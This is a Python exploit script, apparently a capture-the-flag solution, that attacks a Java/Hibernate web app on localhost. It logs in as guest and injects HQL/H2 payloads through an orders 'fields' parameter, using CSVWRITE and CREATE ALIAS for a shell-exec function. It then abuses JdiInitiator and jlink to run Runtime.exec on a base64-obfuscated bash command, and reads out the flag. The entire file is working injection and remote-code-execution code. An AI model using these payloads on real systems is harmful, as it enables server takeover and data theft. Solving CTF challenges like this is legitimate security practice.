import base64
import requests

base_url = "http://localhost:1337"

leak_sess_id = "a"
cmd = "/flag"

sess = requests.Session()

sessionId = sess.post(
    f"{base_url}/login", data={"username": "guest", "password": "guest"}
)

p = """
\\" and function('CSVWRITE','/tmp/kek','select 1;CREATE ALIAS SHELLEXEC AS ''void leak(String sessId, String cmd) throws java.lang.Exception {sekai.HibernateUtil.addSession(new sekai.Session(sekai.HibernateUtil.addUser(new sekai.User(new java.lang.String(new java.lang.ProcessBuilder(cmd).start().getInputStream().readAllBytes()).concat(new java.lang.String(new byte[]{39, 124, 124, 34})), cmd)), sessId));}//''; CALL SHELLEXEC(''%s'', ''%s'')','charset=UTF-8')=\\"
""".replace(
    "\n", ""
) % (
    leak_sess_id,
    cmd,
)

cmd = f"""
wget --header='Content-Type: application/x-www-form-urlencoded' --post-data "username=u&password={p}" http://127.0.0.1:8000/login
""".strip()

cmd = (
    "/bin/bash -c {echo,"
    + base64.b64encode(cmd.encode()).decode()
    + "}|{base64,-d}|{bash,-i}"
)

constr_bytes = "/**/,".join(
    ",".join(str(ord(c)) for c in cmd[i : i + 60]) for i in range(0, len(cmd), 60)
)

java_code = (
    """
Runtime.getRuntime().exec(new String(new byte[]{%s}));
"""
    % constr_bytes
)

col = f'new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), "jdk/tools/jlink/internal/Main --save-opts /tmp/lol", true, "localhost", 3000000, new map("jdk/tools/jlink/internal/Main --output /tmp/ab --add-modules java.base -p \\"\\n{java_code}\\" --save-opts /tmp/lol" as main, "n,server=y,suspend=n,address=localhost:13370" as includevirtualthreads))'

col = f"{col} union select {col} "


def order(sessionId, fields):
    return sess.post(
        f"{base_url}/orders",
        data={"sessionId": sessionId, "fields": fields},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )


order(sessionId=sessionId, fields=col)

col = f'new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), "jdk/internal/jshell/tool/JShellToolProvider /tmp/lol", true, "localhost", 3000000, new map("n,server=y,suspend=n,address=localhost:13370" as includevirtualthreads))'

col = f"{col} union select {col} "

order(sessionId=sessionId, fields=col)

print(order(sessionId=leak_sess_id, fields="1||'").text)
